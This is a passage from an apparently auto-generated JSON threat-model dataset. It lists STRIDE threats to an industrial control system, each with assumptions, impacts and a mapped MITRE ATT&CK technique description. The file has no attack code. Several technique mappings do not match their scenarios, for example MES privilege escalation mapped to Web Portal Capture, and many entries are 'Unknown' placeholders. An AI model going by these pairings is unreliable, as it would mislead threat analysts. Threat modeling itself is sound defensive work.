            ],
            "Potential Impact": "Access to and unauthorized modification of sensitive data, compromising data integrity and confidentiality",
            "MITRE ATT&CK Keywords": [
                "insider threat",
                "privilege escalation",
                "data access"
            ],
            "mitre_technique": {
                "name": "Services Registry Permissions Weakness",
                "description": "Adversaries may execute their own malicious payloads by hijacking the Registry entries used by services. Adversaries may use flaws in the permissions for Registry keys related to services to redirect from the originally specified executable to one that they control, in order to launch their own code when a service starts. Windows stores local service configuration information in the Registry under <code>HKLM\\SYSTEM\\CurrentControlSet\\Services</code>. The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe,  [PowerShell](https://attack.mitre.org/techniques/T1059/001), or [Reg](https://attack.mitre.org/software/S0075). Access to Registry keys is controlled through access control lists and user permissions. (Citation: Registry Key Security)(Citation: malware_hides_service)\n\nIf the permissions for users and groups are not properly set and allow access to the Registry keys for a service, adversaries may change the service's binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to establish persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).\n\nAdversaries may also alter other Registry keys in the service\u2019s Registry tree. For example, the <code>FailureCommand</code> key may be changed so that the service is executed in an elevated context anytime the service fails or is intentionally corrupted.(Citation: Kansa Service related collectors)(Citation: Tweet Registry Perms Weakness)\n\nThe <code>Performance</code> key contains the name of a driver service's performance DLL and the names of several exported functions in the DLL.(Citation: microsoft_services_registry_tree) If the <code>Performance</code> key is not already present and if an adversary-controlled user has the <code>Create Subkey</code> permission, adversaries may create the <code>Performance</code> key in the service\u2019s Registry tree to point to a malicious DLL.(Citation: insecure_reg_perms)\n\nAdversaries may also add the <code>Parameters</code> key, which stores driver-specific data, or other custom subkeys for their malicious services to establish persistence or enable other malicious activities.(Citation: microsoft_services_registry_tree)(Citation: troj_zegost) Additionally, If adversaries launch their malicious services using svchost.exe, the service\u2019s file may be identified using <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\servicename\\Parameters\\ServiceDll</code>.(Citation: malware_hides_service)",
                "id": "attack-pattern--17cc750b-e95b-4d7d-9dde-49e0de24148c",
                "technique_id": "T1574.011"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits vulnerabilities in the gateway to execute unauthorized commands",
            "Assumptions": [
                {
                    "Assumption": "The gateway software contains exploitable vulnerabilities",
                    "Role": "Developer",
                    "Condition": "Presence of unpatched or unknown vulnerabilities"
                },
                {
                    "Assumption": "Adequate gateway security measures are lacking",
                    "Role": "System Administrator",
                    "Condition": "Insufficient security controls"
                }
            ],
            "Potential Impact": "Execution of unauthorized commands can disrupt data flow and industrial processes",
            "MITRE ATT&CK Keywords": [
                "gateway exploitation",
                "command injection",
                "system compromise"
            ],
            "mitre_technique": {
                "name": "Compromise Hardware Supply Chain",
                "description": "Adversaries may manipulate hardware components in products prior to receipt by a final consumer for the purpose of data or system compromise. By modifying hardware or firmware in the supply chain, adversaries can insert a backdoor into consumer networks that may be difficult to detect and give the adversary a high degree of control over the system. Hardware backdoors may be inserted into various devices, such as servers, workstations, network infrastructure, or peripherals.",
                "id": "attack-pattern--39131305-9282-45e4-ac3b-591d2d4fc3ef",
                "technique_id": "T1195.003"
            }
        }
    ]
},
{
    "case_number": "4",
    "batch_number": "7",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker spoofs the identity of a legitimate RTU to send malicious commands to field devices.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has network access to communicate with RTUs.",
                    "Role": "Network Intruder",
                    "Condition": "Valid if perimeter defenses are weak or compromised."
                },
                {
                    "Assumption": "The attacker has knowledge of the communication protocol used by RTUs.",
                    "Role": "Cyber Criminal",
                    "Condition": "Valid if protocol is publicly documented or can be reverse-engineered."
                },
                {
                    "Assumption": "The RTU lacks robust mutual authentication mechanisms.",
                    "Role": "System Designer",
                    "Condition": "Valid if authentication methods are outdated or not implemented."
                }
            ],
            "Potential Impact": "Could lead to unauthorized control of industrial processes.",
            "MITRE ATT&CK Keywords": [
                "Identity Spoofing",
                "Network Intrusion",
                "Reconnaissance",
                "Control System"
            ],
            "mitre_technique": {
                "name": "Gather Victim Identity Information",
                "description": "Adversaries may gather information about the victim's identity that can be used during targeting. Information about identities may include a variety of details, including personal data (ex: employee names, email addresses, security question responses, etc.) as well as sensitive details such as credentials or multi-factor authentication (MFA) configurations.\n\nAdversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about users could also be enumerated via other active means (i.e. [Active Scanning](https://attack.mitre.org/techniques/T1595)) such as probing and analyzing responses from authentication services that may reveal valid usernames in a system or permitted MFA /methods associated with those usernames.(Citation: GrimBlog UsernameEnum)(Citation: Obsidian SSPR Abuse 2023) Information about victims may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: OPM Leak)(Citation: Register Deloitte)(Citation: Register Uber)(Citation: Detectify Slack Tokens)(Citation: Forbes GitHub Creds)(Citation: GitHub truffleHog)(Citation: GitHub Gitrob)(Citation: CNET Leaks)\n\nGathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566) or [Valid Accounts](https://attack.mitre.org/techniques/T1078)).",
                "id": "attack-pattern--5282dd9a-d26d-4e16-88b7-7c0f4553daf4",
                "technique_id": "T1589"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker poses as a legitimate HMI operator to gain access to the Control Center.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to the HMI network.",
                    "Role": "Insider Threat",
                    "Condition": "Valid if internal security measures are insufficient."
                },
                {
                    "Assumption": "The attacker has stolen or guessed the credentials of a legitimate operator.",
                    "Role": "Phishing Attacker",
                    "Condition": "Valid if password policies are weak or phishing attacks are successful."
                },
                {
                    "Assumption": "The HMI lacks multi-factor authentication.",
                    "Role": "System Administrator",
                    "Condition": "Valid if advanced authentication methods are not in place."
                }
            ],
            "Potential Impact": "Could lead to unauthorized monitoring and manipulation of manufacturing processes.",
            "MITRE ATT&CK Keywords": [
                "Credentials Theft",
                "Privileged User Impersonation",
                "Access Control"
            ],
            "mitre_technique": {
                "name": "Use Alternate Authentication Material",
                "description": "Adversaries may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls. \n\nAuthentication processes generally require a valid identity (e.g., username) along with one or more authentication factors (e.g., password, pin, physical smart card, token generator, etc.). Alternate authentication material is legitimately generated by systems after a user or application successfully authenticates by providing a valid identity and the required authentication factor(s). Alternate authentication material may also be generated during the identity creation process.(Citation: NIST Authentication)(Citation: NIST MFA)\n\nCaching alternate authentication material allows the system to verify an identity has successfully authenticated without asking the user to reenter authentication factor(s). Because the alternate authentication must be maintained by the system\u2014either in memory or on disk\u2014it may be at risk of being stolen through [Credential Access](https://attack.mitre.org/tactics/TA0006) techniques. By stealing alternate authentication material, adversaries are able to bypass system access controls and authenticate to systems without knowing the plaintext password or any additional authentication factors.\n",
                "id": "attack-pattern--51a14c76-dd3b-440b-9c20-2bf91d25a814",
                "technique_id": "T1550"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses fake MQTT credentials to interact with the cloud services.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has intercepted or guessed valid MQTT credentials.",
                    "Role": "Man-in-the-Middle",
                    "Condition": "Valid if communication encryption is weak or not implemented."
                },
                {
                    "Assumption": "The attacker has network access to the MQTT broker.",
                    "Role": "Network Intruder",
                    "Condition": "Valid if network segmentation is insufficient."
                },
                {
                    "Assumption": "The MQTT broker lacks logging to detect abnormal access patterns.",
                    "Role": "Operations Team",
                    "Condition": "Valid if monitoring tools are not comprehensive."
                }
            ],
            "Potential Impact": "Could lead to unauthorized data access and manipulation in the cloud.",
            "MITRE ATT&CK Keywords": [
                "Data Theft",
                "Cloud Service Exploitation",
                "Unauthorized Access"
            ],
            "mitre_technique": {
                "name": "Exploitation of Remote Services",
                "description": "Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.\n\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through [Network Service Discovery](https://attack.mitre.org/techniques/T1046) or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\n\nThere are several well-known vulnerabilities that exist in common services such as SMB (Citation: CIS Multiple SMB Vulnerabilities) and RDP (Citation: NVD CVE-2017-0176) as well as applications that may be used within internal networks such as MySQL (Citation: NVD CVE-2016-6662) and web server services.(Citation: NVD CVE-2014-7169)\n\nDepending on the permissions level of the vulnerable remote service an adversary may achieve [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) as a result of lateral movement exploitation as well.",
                "id": "attack-pattern--9db0cf3a-a3c9-4012-8268-123b9db6fd82",
                "technique_id": "T1210"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker tampers with data being transmitted between RTUs and the Control Center.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to the communication channel.",
                    "Role": "Network Eavesdropper",
                    "Condition": "Valid if network security is weak."
                },
                {
                    "Assumption": "Data transmissions are not adequately encrypted.",
                    "Role": "System Designer",
                    "Condition": "Valid if outdated protocols are used."
                },
                {
                    "Assumption": "The system lacks integrity checks on critical data.",
                    "Role": "Software Developer",
                    "Condition": "Valid if data validation mechanisms are absent or weak."
                }
            ],
            "Potential Impact": "Could lead to corrupted control commands and incorrect system operations.",
            "MITRE ATT&CK Keywords": [
                "Data Manipulation",
                "Communication Interception",
                "Integrity Compromise"
            ],
            "mitre_technique": {
                "name": "Transmitted Data Manipulation",
                "description": "Adversaries may alter data en route to storage or other systems in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating transmitted data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nManipulation may be possible over a network connection or between system processes where there is an opportunity deploy a tool that will intercept and change information. The type of modification and the impact it will have depends on the target transmission mechanism as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--cc1e737c-236c-4e3b-83ba-32039a626ef8",
                "technique_id": "T1493"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies firmware on PLCs to alter their behavior.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has physical or network access to PLCs.",
                    "Role": "Field Intruder",
                    "Condition": "Valid if physical or network security measures are inadequate."
                },
                {
                    "Assumption": "Firmware update procedures lack authentication mechanisms.",
                    "Role": "Engineers",
                    "Condition": "Valid if outdated or insecure update mechanisms are in use."
                },
                {
                    "Assumption": "The PLC lacks checks for firmware integrity.",
                    "Role": "Device Manufacturer",
                    "Condition": "Valid if the device firmware does not have built-in integrity checks."
                }
            ],
            "Potential Impact": "Could lead to malfunctioning or compromised industrial processes.",
            "MITRE ATT&CK Keywords": [
                "Firmware Corruption",
                "Device Exploitation",
                "Control Logic Manipulation"
            ],
            "mitre_technique": {
                "name": "Firmware Corruption",
                "description": "Adversaries may overwrite or corrupt the flash memory contents of system BIOS or other firmware in devices attached to a system in order to render them inoperable or unable to boot, thus denying the availability to use the devices and/or the system.(Citation: Symantec Chernobyl W95.CIH) Firmware is software that is loaded and executed from non-volatile memory on hardware devices in order to initialize and manage device functionality. These devices may include the motherboard, hard drive, or video cards.\n\nIn general, adversaries may manipulate, overwrite, or corrupt firmware in order to deny the use of the system or devices. For example, corruption of firmware responsible for loading the operating system for network devices may render the network devices inoperable.(Citation: dhs_threat_to_net_devices)(Citation: cisa_malware_orgs_ukraine) Depending on the device, this attack may also result in [Data Destruction](https://attack.mitre.org/techniques/T1485). ",
                "id": "attack-pattern--f5bb433e-bdf6-4781-84bc-35e97e43be89",
                "technique_id": "T1495"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies cloud-stored operational data.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access credentials to the cloud services.",
                    "Role": "Malicious Insider or Cyber Criminal",
                    "Condition": "Valid if credential management is ineffective."
                },
                {
                    "Assumption": "The cloud infrastructure lacks robust access controls.",
                    "Role": "Cloud Administrator",
                    "Condition": "Valid if access controls are not granular or properly configured."
                },
                {
                    "Assumption": "Data integrity checks are not performed regularly.",
                    "Role": "Database Admin",
                    "Condition": "Valid if integrity verification is not part of routine operations."
                }
            ],
            "Potential Impact": "Could lead to erroneous analytics and decision-making based on tampered data.",
            "MITRE ATT&CK Keywords": [
                "Cloud Data Manipulation",
                "Data Integrity Attack",
                "Operational Disruption"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker denies sending malicious control commands sent to RTUs.",
            "Assumptions": [
                {
                    "Assumption": "System logs are not detailed or tamper-proof.",
                    "Role": "System Administrator",
                    "Condition": "Valid if logging systems are weak or not securely configured."
                },
                {
                    "Assumption": "RTUs do not log command origin metadata.",
                    "Role": "RTU Developer",
                    "Condition": "Valid if RTUs lack detailed logging mechanisms for command origin."
                },
                {
                    "Assumption": "There are no non-repudiation mechanisms in place.",
                    "Role": "Security Architect",
                    "Condition": "Valid if crucial actions are not logged and signed."
                }
            ],
            "Potential Impact": "Could lead to difficulty in tracing the origin of malicious activities.",
            "MITRE ATT&CK Keywords": [
                "Log Tampering",
                "Non-Repudiation Failure",
                "Accountability Evasion"
            ],
            "mitre_technique": {
                "name": "Kernel Modules and Extensions",
                "description": "Loadable Kernel Modules (or LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system. (Citation: Linux Kernel Programming)\u00a0When used maliciously, Loadable Kernel Modules (LKMs) can be a type of kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014) that run with the highest operating system privilege (Ring 0). (Citation: Linux Kernel Module Programming Guide)\u00a0Adversaries can use loadable kernel modules to covertly persist on a system and evade defenses. Examples have been found in the wild and there are some open source projects. (Citation: Volatility Phalanx2) (Citation: CrowdStrike Linux Rootkit) (Citation: GitHub Reptile) (Citation: GitHub Diamorphine)\n\nCommon features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors and enabling root access to non-privileged users. (Citation: iDefense Rootkit Overview)\n\nKernel extensions, also called kext, are used for macOS to load functionality onto a system similar to LKMs for Linux. They are loaded and unloaded through <code>kextload</code> and <code>kextunload</code> commands. Several examples have been found where this can be used. (Citation: RSAC 2015 San Francisco Patrick Wardle) (Citation: Synack Secure Kernel Extension Broken) Examples have been found in the wild. (Citation: Securelist Ventir)",
                "id": "attack-pattern--6be14413-578e-46c1-8304-310762b3ecd5",
                "technique_id": "T1215"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker disputes having accessed sensitive data on cloud storage.",
            "Assumptions": [
                {
                    "Assumption": "Cloud access logs are not immutable.",
                    "Role": "Cloud Provider",
                    "Condition": "Valid if logs can be altered or deleted after activities."
                },
                {
                    "Assumption": "Access control mechanisms lack proper auditing capabilities.",
                    "Role": "Cloud Administrator",
                    "Condition": "Valid if there are no sufficient audit trails for access events."
                },
                {
                    "Assumption": "Identity verification is not thoroughly implemented.",
                    "Role": "Identity and Access Management (IAM) Admin",
                    "Condition": "Valid if identity proofs are weak or non-existent."
                }
            ],
            "Potential Impact": "Compromised confidentiality of sensitive data with no traceability.",
            "MITRE ATT&CK Keywords": [
                "Log Deletion",
                "Audit Trail Manipulation",
                "Accountability Bypass"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker denies having implemented malicious configurations on field devices.",
            "Assumptions": [
                {
                    "Assumption": "Field device changes are not logged.",
                    "Role": "Field Device Administrator",
                    "Condition": "Valid if configuration changes are not monitored and logged."
                },
                {
                    "Assumption": "No multi-factor authentication for critical changes.",
                    "Role": "Security Engineer",
                    "Condition": "Valid if only single-factor authentication is used for field device changes."
                },
                {
                    "Assumption": "Field devices lack tamper-evident logging.",
                    "Role": "Equipment Manufacturer",
                    "Condition": "Valid if logging mechanisms can be tampered with."
                }
            ],
            "Potential Impact": "Disruption of industrial processes with no accountability.",
            "MITRE ATT&CK Keywords": [
                "Configuration Manipulation",
                "Audit Evasion",
                "Industrial Control System Compromise"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker captures unencrypted data between field devices and RTUs.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has network access to intercept communication.",
                    "Role": "Network Sniffer",
                    "Condition": "Valid if network traffic is not isolated or protected."
                },
                {
                    "Assumption": "Data in transit is not encrypted end-to-end.",
                    "Role": "System Architect",
                    "Condition": "Valid if encryption protocols are not implemented."
                },
                {
                    "Assumption": "Network segmentation is insufficient.",
                    "Role": "Network Engineer",
                    "Condition": "Valid if there's a lack of proper network segmentation."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive operational data.",
            "MITRE ATT&CK Keywords": [
                "Network Eavesdropping",
                "Data Interception",
                "Confidentiality Breach"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--0a4e155d-c86f-4b9c-8b81-55602c4e307e",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker gains access to sensitive data stored in the cloud through compromised credentials.",
            "Assumptions": [
                {
                    "Assumption": "Cloud access controls are insufficient.",
                    "Role": "Cloud Security Engineer",
                    "Condition": "Valid if access controls are not properly configured."
                },
                {
                    "Assumption": "The attacker has gained valid user credentials.",
                    "Role": "Cyber Criminal",
                    "Condition": "Valid if credential theft methods are successful."
                },
                {
                    "Assumption": "Sensitive data is not adequately encrypted at rest.",
                    "Role": "Database Administrator",
                    "Condition": "Valid if encryption standards are not enforced on stored data."
                }
            ],
            "Potential Impact": "Exposure of sensitive industrial and business data.",
            "MITRE ATT&CK Keywords": [
                "Credential Theft",
                "Cloud Data Access",
                "Data Exposure"
            ],
            "mitre_technique": {
                "name": "Valid Accounts",
                "description": "Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop.(Citation: volexity_0day_sophos_FW) Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.\n\nIn some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account.(Citation: CISA MFA PrintNightmare)\n\nThe overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.(Citation: TechNet Credential Theft)",
                "id": "attack-pattern--b17a1a56-e99c-403c-8948-561df0cffe81",
                "technique_id": "T1078"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker leverages vulnerabilities in the IoT devices to exfiltrate data.",
            "Assumptions": [
                {
                    "Assumption": "IoT devices have unpatched vulnerabilities.",
                    "Role": "Device Engineer",
                    "Condition": "Valid if devices are not kept up to date with security patches."
                },
                {
                    "Assumption": "Access control policies for IoT devices are lax.",
                    "Role": "Security Administrator",
                    "Condition": "Valid if there's no strict control over device access."
                },
                {
                    "Assumption": "Communication between devices and the network is not encrypted.",
                    "Role": "Network Architect",
                    "Condition": "Valid if encryption protocols are weak or missing."
                }
            ],
            "Potential Impact": "Leads to unauthorized data access and possible exploitation.",
            "MITRE ATT&CK Keywords": [
                "IoT Vulnerability",
                "Data Exfiltration",
                "Network Security"
            ],
            "mitre_technique": {
                "name": "Traffic Duplication",
                "description": "Adversaries may leverage traffic mirroring in order to automate data exfiltration over compromised infrastructure. Traffic mirroring is a native feature for some devices, often used for network analysis. For example, devices may be configured to forward network traffic to one or more destinations for analysis by a network analyzer or other monitoring device. (Citation: Cisco Traffic Mirroring)(Citation: Juniper Traffic Mirroring)\n\nAdversaries may abuse traffic mirroring to mirror or redirect network traffic through other infrastructure they control. Malicious modifications to network devices to enable traffic redirection may be possible through [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) or [Patch System Image](https://attack.mitre.org/techniques/T1601/001).(Citation: US-CERT-TA18-106A)(Citation: Cisco Blog Legacy Device Attacks)\n\nMany cloud-based environments also support traffic mirroring. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.(Citation: AWS Traffic Mirroring)(Citation: GCP Packet Mirroring)(Citation: Azure Virtual Network TAP)\n\nAdversaries may use traffic duplication in conjunction with [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Input Capture](https://attack.mitre.org/techniques/T1056), or [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) depending on the goals and objectives of the adversary.",
                "id": "attack-pattern--7c46b364-8496-4234-8a56-f7e6727e21e1",
                "technique_id": "T1020.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker floods the Control Center\u2019s WAN with traffic, disrupting communication with RTUs.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can send large volumes of traffic to the Control Center.",
                    "Role": "DDoS Attacker",
                    "Condition": "Valid if perimeter defenses are weak against volumetric attacks."
                },
                {
                    "Assumption": "Network bandwidth is insufficient to handle sudden spikes.",
                    "Role": "Network Administrator",
                    "Condition": "Valid if network resources are not scaled for large attacks."
                },
                {
                    "Assumption": "No DDoS mitigation services are in place.",
                    "Role": "IT Security Team",
                    "Condition": "Valid if proactive defenses are not implemented."
                }
            ],
            "Potential Impact": "Disruption of control commands and data collection.",
            "MITRE ATT&CK Keywords": [
                "Traffic Flooding",
                "Network Disruption",
                "Service Denial"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker exploits a vulnerability in the cloud services to crash the data analytics module.",
            "Assumptions": [
                {
                    "Assumption": "Cloud services have unpatched vulnerabilities.",
                    "Role": "Cloud Service Provider",
                    "Condition": "Valid if security patches are not timely applied."
                },
                {
                    "Assumption": "Attack recovery mechanisms are not in place.",
                    "Role": "Disaster Recovery Team",
                    "Condition": "Valid if there are no processes for quick recovery."
                },
                {
                    "Assumption": "Logging and monitoring are inadequate.",
                    "Role": "Monitoring Team",
                    "Condition": "Valid if no alerts are in place for such failures."
                }
            ],
            "Potential Impact": "Loss of real-time analytics and monitoring capabilities.",
            "MITRE ATT&CK Keywords": [
                "Cloud Service Abuse",
                "Data Processing Disruption",
                "Downtime"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker sends malformed data to PLCs, causing them to enter a failure state.",
            "Assumptions": [
                {
                    "Assumption": "PLCs do not validate incoming data rigorously.",
                    "Role": "PLC Engineer",
                    "Condition": "Valid if data validation protocols are weak."
                },
                {
                    "Assumption": "The attacker has access to the network communicating with PLCs.",
                    "Role": "Network Intruder",
                    "Condition": "Valid if network segmentation is inadequate."
                },
                {
                    "Assumption": "There are no automated recovery procedures for PLC failures.",
                    "Role": "Maintenance Team",
                    "Condition": "Valid if manual interventions are required for recovery."
                }
            ],
            "Potential Impact": "Interruption of industrial processes executed by the PLCs.",
            "MITRE ATT&CK Keywords": [
                "Malformed Data Injection",
                "Device Crash",
                "Operational Interruption"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a software vulnerability in the MES to gain administrative privileges.",
            "Assumptions": [
                {
                    "Assumption": "MES software contains exploitable vulnerabilities.",
                    "Role": "Software Developer",
                    "Condition": "Valid if software patches are not regularly applied."
                },
                {
                    "Assumption": "Attack detection systems are insufficient.",
                    "Role": "Security Operation Center (SOC)",
                    "Condition": "Valid if malicious activities are not quickly detected."
                },
                {
                    "Assumption": "Least privilege principle is not enforced.",
                    "Role": "Access Control Manager",
                    "Condition": "Valid if users have more privileges than necessary."
                }
            ],
            "Potential Impact": "Full control over manufacturing workflows and data.",
            "MITRE ATT&CK Keywords": [
                "Privilege Escalation",
                "Software Exploitation",
                "Administrative Access"
            ],
            "mitre_technique": {
                "name": "Web Portal Capture",
                "description": "Adversaries may install code on externally facing portals, such as a VPN login page, to capture and transmit credentials of users who attempt to log into the service. For example, a compromised login page may log provided user credentials before logging the user in to the service.\n\nThis variation on input capture may be conducted post-compromise using legitimate administrative access as a backup measure to maintain network access through [External Remote Services](https://attack.mitre.org/techniques/T1133) and [Valid Accounts](https://attack.mitre.org/techniques/T1078) or as part of the initial compromise by exploitation of the externally facing web service.(Citation: Volexity Virtual Private Keylogging)",
                "id": "attack-pattern--69e5226d-05dc-4f15-95d7-44f5ed78d06e",
                "technique_id": "T1056.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker uses compromised HMI credentials to execute elevated commands in the Control Center.",
            "Assumptions": [
                {
                    "Assumption": "HMI lacks strong authentication mechanisms.",
                    "Role": "HMI Developer",
                    "Condition": "Valid if advanced authentication is not implemented."
                },
                {
                    "Assumption": "User activities are not adequately monitored.",
                    "Role": "Security Monitoring Team",
                    "Condition": "Valid if user actions are not logged and reviewed."
                },
                {
                    "Assumption": "Attackers have prior knowledge of the HMI's operational structure.",
                    "Role": "Insider Threat",
                    "Condition": "Valid if attackers have inside information or documentation."
                }
            ],
            "Potential Impact": "Unauthorized changes to control commands and operational configurations.",
            "MITRE ATT&CK Keywords": [
                "Credential Usage",
                "Administrative Command Execution",
                "System Compromise"
            ],
            "mitre_technique": {
                "name": "Supply Chain Compromise",
                "description": "Adversaries may manipulate products or product delivery mechanisms prior to receipt by a final consumer for the purpose of data or system compromise.\n\nSupply chain compromise can take place at any stage of the supply chain including:\n\n* Manipulation of development tools\n* Manipulation of a development environment\n* Manipulation of source code repositories (public or private)\n* Manipulation of source code in open-source dependencies\n* Manipulation of software update/distribution mechanisms\n* Compromised/infected system images (multiple cases of removable media infected at the factory)(Citation: IBM Storwize)(Citation: Schneider Electric USB Malware) \n* Replacement of legitimate software with modified versions\n* Sales of modified/counterfeit products to legitimate distributors\n* Shipment interdiction\n\nWhile supply chain compromise can impact any component of hardware or software, adversaries looking to gain execution have often focused on malicious additions to legitimate software in software distribution or update channels.(Citation: Avast CCleaner3 2018)(Citation: Microsoft Dofoil 2018)(Citation: Command Five SK 2011) Targeting may be specific to a desired victim set or malicious software may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.(Citation: Symantec Elderwood Sept 2012)(Citation: Avast CCleaner3 2018)(Citation: Command Five SK 2011) Popular open source projects that are used as dependencies in many applications may also be targeted as a means to add malicious code to users of the dependency.(Citation: Trendmicro NPM Compromise)",
                "id": "attack-pattern--3f18edba-28f4-4bb9-82c3-8aa60dcac5f7",
                "technique_id": "T1195"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a misconfigured gateway to gain higher network privileges.",
            "Assumptions": [
                {
                    "Assumption": "The gateway has misconfigured access controls.",
                    "Role": "Network Administrator",
                    "Condition": "Valid if access controls are improperly set."
                },
                {
                    "Assumption": "No proper network segmentation or isolation is implemented.",
                    "Role": "Network Architect",
                    "Condition": "Valid if network design is flawed."
                },
                {
                    "Assumption": "Security monitoring for gateway activities is insufficient.",
                    "Role": "Security Operations Team",
                    "Condition": "Valid if no active monitoring is performed."
                }
            ],
            "Potential Impact": "Enables unauthorized access to different network segments and devices.",
            "MITRE ATT&CK Keywords": [
                "Misconfiguration Exploitation",
                "Network Privilege Escalation",
                "Gateway Breach"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        }
    ]
},
{
    "case_number": "4",
    "batch_number": "8",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker spoofs the identity of an RTU, causing the Control Center to issue incorrect control commands.",
